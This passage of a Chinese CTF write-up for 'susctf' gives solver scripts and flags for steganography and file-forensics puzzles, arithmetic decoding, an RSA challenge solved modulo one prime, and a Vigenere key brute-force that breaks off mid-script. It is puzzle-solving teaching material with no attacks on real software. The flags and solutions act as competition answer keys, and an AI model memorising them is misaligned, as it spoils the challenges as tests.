</span></span><span class="line"><span class="cl"><span class="n">textArr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.{&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">textArr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里开始的n加2是因为要扔掉前两个字符。最后使用正则表达式确定flag的位置。结果如下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015180844689.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015180844689.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015180844689.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015180844689.png?size=large 2x" sizes="auto" data-title="image-20231015180844689" data-alt="image-20231015180844689" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x04-百团改">0x04 百团（改）</h2>
<p>首先扫描二维码发现unicode加密内容，解密后为当铺密码：<code>士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大</code></p>
<p>使用脚本解密后，发现是16进制对应的ascii码：</p>
<div class="highlight" id="id-2"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">dh</span> <span class="o">=</span> <span class="s1">&#39;田口由中人工大土士王夫井羊壮天&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ds</span> <span class="o">=</span> <span class="s1">&#39;001234555678996&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cip</span> <span class="o">=</span> <span class="s1">&#39;士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cip</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">dh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">s</span> <span class="o">+=</span> <span class="n">ds</span><span class="p">[</span><span class="n">dh</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">s</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 53 55 53 20 23 34 79 20 77 33 31 63 30 23 65 20 75</span></span></span></code></pre></td></tr></table>
</div>
</div><p>解密后为：SUS #4y w31c0#e u</p>
<p>此时直接交上去是不对的，于是考虑png隐写。</p>
<p>使用010打开发现png结尾有PK头，于是给foremost解密：</p>
<div class="highlight" id="id-3"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">foremost half.png</span></span></code></pre></td></tr></table>
</div>
</div><p>生成的output文件夹如下：<img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181749492.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181749492.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181749492.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181749492.png?size=large 2x" sizes="auto" data-title="image-20231015181749492" data-alt="image-20231015181749492" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>直接解压zip，发现需要密码。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181932693.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181932693.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181932693.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181932693.png?size=large 2x" sizes="auto" data-title="image-20231015181932693" data-alt="image-20231015181932693" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>能想到的只有SUS #4y w31c0#e u，填入解得另一半flag：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182025272.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182025272.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182025272.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182025272.png?size=large 2x" sizes="auto" data-title="image-20231015182025272" data-alt="image-20231015182025272" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>flag为：</p>
<div class="highlight" id="id-4"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">susctf{SUS #4y w31c0#e u_join us!}</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0x05-can_u_find_meeeeee">0x05 Can_u_find_meeeeee?</h2>
<p>猜测藏匿了字符串。</p>
<p>使用everything软件，进入题目所在文件夹，填入<code>content:sus</code>，等待一会儿，发现：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182457002.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182457002.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182457002.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182457002.png?size=large 2x" sizes="auto" data-title="image-20231015182457002" data-alt="image-20231015182457002" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>根据题目can u find me，答案可能在.me中。打开后搜索susctf，找到：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182622146.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182622146.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182622146.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182622146.png?size=large 2x" sizes="auto" data-title="image-20231015182622146" data-alt="image-20231015182622146" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>但是感觉内容不大对劲，有点像base加密。解密后得：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182726169.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182726169.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182726169.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182726169.png?size=large 2x" sizes="auto" data-title="image-20231015182726169" data-alt="image-20231015182726169" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>加上susctf{}即为答案。</p>
<h2 id="0x06-ai-kerasmodelsummary">0x06 AI-keras.Model.summary()</h2>
<p>首先用010看一下文件，</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183036819.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183036819.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183036819.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183036819.png?size=large 2x" sizes="auto" data-title="image-20231015183036819" data-alt="image-20231015183036819" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现头部是HDF，于是使用HDFView打开：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183246330.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183246330.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183246330.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183246330.png?size=large 2x" sizes="auto" data-title="image-20231015183246330" data-alt="image-20231015183246330" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里显示是乱的，整理了好久，发现010中也能找到：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183526739.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183526739.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183526739.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183526739.png?size=large 2x" sizes="auto" data-title="image-20231015183526739" data-alt="image-20231015183526739" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>flag为：</p>
<div class="highlight" id="id-5"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">susctf{have_fun_with_deep_conv_net}</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0x07-算术">0x07 算术！</h2>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114244509.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114244509.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114244509.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114244509.png?size=large 2x" sizes="auto" data-title="image-20231016114244509" data-alt="image-20231016114244509" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>根据算术编码的过程进行解码：</p>
<p>给定概率是：0.438875</p>
<p>第一次在第一个区间，于是第一个字母是a。</p>
<p>将第一个区间等比例扩大到1，分段为：0-0.25-0.4-0.4- 0.5</p>
<p>发现在第三个区间，第二个字母为l。</p>
<p>将第三个区间等比例扩大到1，分段为：0.4 -0.425-0.44-0.445-0.45</p>
<p>发现在第2个区间，第三个字母为o。</p>
<p>将第二个区间等比例扩大到1，前三段分段为：0.425-0.4325-0.437-0.4385</p>
<p>此时已经确定第四个字母是h（0.4388 &gt; 0.4385）</p>
<p>最后一个个字符所在区间为下一级的第一个区间：</p>
<p>0.4385-0.44425，即为a。</p>
<p>综上：flag为susctf{aloha}</p>
<h1 id="crypto">Crypto</h1>
<h2 id="0x01-signin">0x01 Signin</h2>
<p>这题如果直接尝试求D的话会发现e和phi并不互质。</p>
<p>但是这里发现e和q-1是互质的，同时我们知道，在c不是p或q的倍数的情况下：</p>
<div class="highlight" id="id-6"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">m = c ^ d mod n
</span></span><span class="line"><span class="cl">==&gt;
</span></span><span class="line"><span class="cl">m = c ^ d mod p
</span></span><span class="line"><span class="cl">m = c ^ d mod q</span></span></code></pre></td></tr></table>
</div>
</div><p>于是可以这样求明文：</p>
<div class="highlight" id="id-7"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">q</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>exp：</p>
<div class="highlight" id="id-8"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="o">=</span> <span class="mi">9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span> <span class="mi">95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657</span>
</span></span><span class="line"><span class="cl"><span class="n">q</span><span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span> <span class="mi">2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">=</span> <span class="mi">31531</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">))</span></span></span></code></pre></td></tr></table>
</div>
</div><p>答案为：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015190926432.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015190926432.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015190926432.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015190926432.png?size=large 2x" sizes="auto" data-title="image-20231015190926432" data-alt="image-20231015190926432" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x02-vigenere">0x02 Vigenere</h2>
<p>根据题目，得知是维吉尼亚密码：</p>
<div class="highlight" id="id-9"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">flag</span><span class="p">,</span> <span class="n">key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^susctf\{[0-9a-f]</span><span class="si">{8}</span><span class="s2">-([0-9a-f]</span><span class="si">{4}</span><span class="s2">-)</span><span class="si">{3}</span><span class="s2">[0-9a-f]</span><span class="si">{12}</span><span class="s2">\}$&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^[a-z]</span><span class="si">{10}</span><span class="s2">$&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span><span class="p">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">lower</span><span class="p">(),</span> <span class="n">msg</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">k_i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">+=</span> <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">k_i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">))</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>	<span class="c1">#维吉尼亚密码</span>
</span></span><span class="line"><span class="cl">        <span class="n">k_i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">ieplnp{bhtnr6m3-04bm-41w3-lg78-c040377ys146}
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>通过和维吉尼亚密码表对照，得知前六位是<code>qkxjuk</code></p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/15745722093571.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/15745722093571.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/15745722093571.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/15745722093571.png?size=large 2x" sizes="auto" data-title="img" data-alt="img" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>接着发现题目以正则表达式的形式给出了flag的形式，同时知道密码是10位小写字母，那么我们就可以爆破后四位密码（每次用flag的正则检查即可）。</p>
<p>exp:</p>
<div class="highlight" id="id-10"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_flag</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
